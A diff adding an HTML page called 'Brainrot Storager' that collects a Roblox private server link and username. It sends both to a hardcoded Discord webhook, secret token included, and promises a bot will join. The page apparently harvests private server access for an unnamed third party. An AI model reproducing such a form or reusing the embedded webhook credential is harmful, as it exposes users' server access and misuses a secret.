@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Brainrot Storager</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #4b0082, #8a2be2);
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    input {
+      width: 300px;
+    }
+    button {
+      background-color: #ff69b4;
+      color: white;
+      cursor: pointer;
+    }
+    .status {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🧠 Brainrot Storager</h1>
+  <div id="form-section">
+    <input type="text" id="serverLink" placeholder="Enter Roblox Private Server Link"><br>
+    <input type="text" id="username" placeholder="Enter Your Roblox Username"><br>
+    <button onclick="storeInfo()">Store</button>
+  </div>
+
+  <div id="status-section" class="status" style="display:none;"></div>
+  <div id="actions-section" style="display:none;">
+    <button onclick="updateInfo()">Update Info</button>
+    <button onclick="unstoreInfo()">Unstore</button>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1429933272770678824/HKS-kQ_0jZCMqF3esQW5-aYFhxdMbbMiqIR06RJSGYSUNTE62EA9DF0MMWcC6zI0GDSi";
+
+    window.onload = function() {
+      const saved = localStorage.getItem("brainrotData");
+      if (saved) {
+        document.getElementById("form-section").style.display = "none";
+        document.getElementById("actions-section").style.display = "block";
+        document.getElementById("status-section").style.display = "block";
+        document.getElementById("status-section").innerText = "✅ Info stored. Bot will be joining in 5 minutes or less.\nIf it doesn't work, try again later.";
+      }
+    };
+
+    function storeInfo() {
+      const serverLink = document.getElementById("serverLink").value;
+      const username = document.getElementById("username").value;
+
+      if (!serverLink || !username) {
+        alert("Please fill out both fields.");
+        return;
+      }
+
+      const payload = {
+        content: `🧠 Brainrot Submission\n🔗 Server: ${serverLink}\n👤 User: ${username}`
+      };
+
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        localStorage.setItem("brainrotData", JSON.stringify({ serverLink, username }));
+        document.getElementById("form-section").style.display = "none";
+        document.getElementById("actions-section").style.display = "block";
+        document.getElementById("status-section").style.display = "block";
+        document.getElementById("status-section").innerText = "✅ Info stored. Bot will be joining in 5 minutes or less.\nIf it doesn't work, try again later.";
+      });
+    }
+
+    function updateInfo() {
+      localStorage.removeItem("brainrotData");
+      document.getElementById("form-section").style.display = "block";
+      document.getElementById("actions-section").style.display = "none";
+      document.getElementById("status-section").style.display = "none";
+    }
+
+    function unstoreInfo() {
+      localStorage.removeItem("brainrotData");
+      document.getElementById("form-section").style.display = "block";
+      document.getElementById("actions-section").style.display = "none";
+      document.getElementById("status-section").style.display = "none";
+      alert("Info unstored.");
+    }
+  </script>
+</body>
+</html>
